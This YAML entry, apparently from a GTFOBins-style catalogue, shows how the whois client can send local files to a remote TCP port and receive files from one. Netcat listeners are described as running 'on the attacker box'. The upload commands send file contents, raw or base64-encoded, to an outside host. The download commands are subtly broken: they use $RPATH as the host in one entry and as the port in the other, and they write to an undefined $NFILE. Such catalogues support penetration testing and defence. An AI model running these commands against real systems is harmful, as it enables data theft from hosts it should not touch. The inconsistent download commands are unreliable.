---
description: |
  `whois` hangs waiting for the remote peer to close the socket.
functions:
  file-upload:
    - description: Send a text file to a TCP port. Run `nc -l -p 4444 > "file_to_save"` on the attacker box to collect the file. The file has a trailing `$'\x0d\x0a'` and its length is limited by the maximum size of arguments.
      code: |
        whois -h $RHOST -p $RPORT "`cat $LFILE`"
    - description: Send a binary file to a TCP port. Run `nc -l -p 4444 | tr -d $'\x0d' | base64 -d > "file_to_save"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.
      code: |
        whois -h $RHOST -p $RPORT "`base64 $LFILE`"
  file-download:
    - description: Fetch remote text file from a remote TCP port. Run `nc -l -p 4444 < "file_to_send"` on the attacker box to send the file. The file has instances of `$'\x0d'` stripped.
      code: |
        whois -h $RPATH -p $RPORT > "$NFILE"
    - description: Fetch remote binary file from a remote TCP port. Run `base64 "file_to_send" | nc -l -p 4444` on the attacker box to send the file.
      code: |
        whois -h $RHOST -p $RPATH | base64 -d > "$NFILE"
---
